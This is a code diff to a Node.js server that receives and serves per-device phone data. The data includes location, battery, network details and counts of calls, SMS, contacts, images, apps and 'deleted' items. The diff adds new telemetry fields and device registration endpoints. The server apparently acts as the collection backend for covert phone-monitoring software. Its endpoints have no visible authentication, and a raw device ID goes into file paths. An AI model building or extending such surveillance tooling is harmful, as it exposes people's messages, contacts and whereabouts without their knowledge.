@@ -122,10 +122,16 @@ app.post('/live_update.php', (req, res) => {
         const liveFile = path.join(deviceDir, 'live.json');
         let live = {};
         if (fs.existsSync(liveFile)) live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
+        
         live.network = data.network || 'متصل';
+        live.network_type = data.network_type || '';
+        live.network_name = data.network_name || '';
+        live.signal_strength = data.signal_strength || '';
         live.battery = data.battery || null;
+        live.battery_status = data.battery_status || '';
         live.location = data.location || null;
         live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
+        
         fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
         updateDevicesList(deviceId, null);
         res.json({ success: true });
@@ -142,14 +148,35 @@ app.get('/live.php', (req, res) => {
         const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
         const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
         
-        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0 };
+        let response = { 
+            online: false, 
+            network: 'غير متصل', 
+            network_type: '', 
+            network_name: '', 
+            signal_strength: '',
+            battery: null, 
+            battery_status: '',
+            location: null, 
+            last_seen: 0, 
+            seconds_ago: 999999, 
+            call_count: 0, 
+            sms_count: 0, 
+            contacts_count: 0, 
+            images_count: 0, 
+            apps_count: 0, 
+            deleted_count: 0 
+        };
         
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
             const lastSeen = live.last_seen || 0;
             response.online = (Math.floor(Date.now()/1000) - lastSeen) < 300;
             response.network = live.network || 'غير معروف';
+            response.network_type = live.network_type || '';
+            response.network_name = live.network_name || '';
+            response.signal_strength = live.signal_strength || '';
             response.battery = live.battery || null;
+            response.battery_status = live.battery_status || '';
             response.location = live.location || null;
             response.last_seen = lastSeen;
             response.seconds_ago = Math.floor(Date.now()/1000) - lastSeen;
@@ -212,13 +239,24 @@ app.get('/api.php', (req, res) => {
             return res.json({ reset: false });
         }
         
+        if (action === 'check_device') {
+            const deviceExists = fs.existsSync(path.join(dataDir, deviceId));
+            return res.json({ exists: deviceExists });
+        }
+        
+        if (action === 'register') {
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true });
+        }
+        
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
             return res.json([]);
         }
         
-        // ✅ استرجاع المحذوفات
         if (action === 'get_deleted') {
             const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
             if (fs.existsSync(deletedFile)) return res.json(JSON.parse(fs.readFileSync(deletedFile, 'utf8')));
